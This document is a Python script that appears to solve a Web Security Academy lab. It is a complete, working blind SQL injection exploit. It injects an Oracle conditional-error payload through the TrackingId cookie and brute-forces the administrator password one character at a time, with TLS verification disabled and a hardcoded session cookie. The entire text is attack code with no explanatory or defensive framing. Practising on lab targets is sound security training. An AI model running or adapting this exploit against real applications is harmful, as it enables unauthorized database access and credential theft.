import sys;import requests;import urllib;import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
host = "https://ac891fc11e900c7cc0ae11d900af004c.web-security-academy.net/"
length=20

def main():
    password = ""
    lenth = 20
    sys.stdout.write('getting the administrator password...\n')
    for i in range(1, length+1):
        for j in range(48, 123):
            enc_payload = urllib.parse.quote(("DEF0bHmWJhtwncji' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, %d, 1) = '%s') THEN 'b' ELSE to_char(1/0) END FROM users WHERE ROWNUM = 1)='a' --" %(i, chr(j))))
            cookies = {'TrackingId': enc_payload, 'session': "AaQbAgm2hTo1QcangSUEDKMhl06dqTbn"}
            response = requests.get(host, cookies=cookies, verify=False, proxies=proxies)
            if response.status_code == 200:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()
    sys.stdout.write("%s" %(password))
if __name__ == "__main__":
    main()
